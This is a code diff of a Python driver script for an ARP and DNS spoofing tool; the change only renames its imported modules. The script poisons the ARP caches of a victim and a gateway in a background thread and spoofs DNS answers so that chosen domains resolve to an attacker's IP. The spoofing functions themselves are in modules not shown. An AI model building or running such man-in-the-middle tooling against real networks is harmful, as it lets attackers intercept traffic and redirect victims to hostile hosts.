@@ -4,8 +4,8 @@ import argparse
 import threading
 import os
 
-import arp_spoof
-import dns_spoof
+import arp
+import dns
 
 def main():
     parser = argparse.ArgumentParser(description="ARP and DNS Spoofing Tool. Victim and Gateway IPs required.")
@@ -15,14 +15,12 @@ def main():
     args = parser.parse_args()
 
 
-
-
     print("[+] Starting ARP Spoofing... Press CTRL+C to stop")
 
     try:
         
-        victim_mac = arp_spoof.get_mac(args.victim)
-        gateway_mac = arp_spoof.get_mac(args.gateway)
+        victim_mac = arp.get_mac(args.victim)
+        gateway_mac = arp.get_mac(args.gateway)
 
         
         if not victim_mac or not gateway_mac:
@@ -34,18 +32,18 @@ def main():
 
         # Start ARP Spoofing in a speerate thread
         arp_thread = threading.Thread(
-            target=arp_spoof.start_arp_spoof, 
+            target=arp.start_arp_spoof, 
             args=(args.victim, args.gateway, victim_mac, gateway_mac),
             daemon=True
         )
         arp_thread.start()
 
         # Start DNS Spoofing in the main thread
-        dns_spoof.start_dns_spoof(args.targets, args.attacker_ip)
+        dns.start_dns_spoof(args.targets, args.attacker_ip)
 
     except KeyboardInterrupt:
         print("\n[+] Stopping ARP Spoofing. Restoring network...")
-        arp_spoof.restore(args.victim, victim_mac, args.gateway, gateway_mac)
+        arp.restore(args.victim, victim_mac, args.gateway, gateway_mac)
 
 if __name__ == "__main__":
     main()
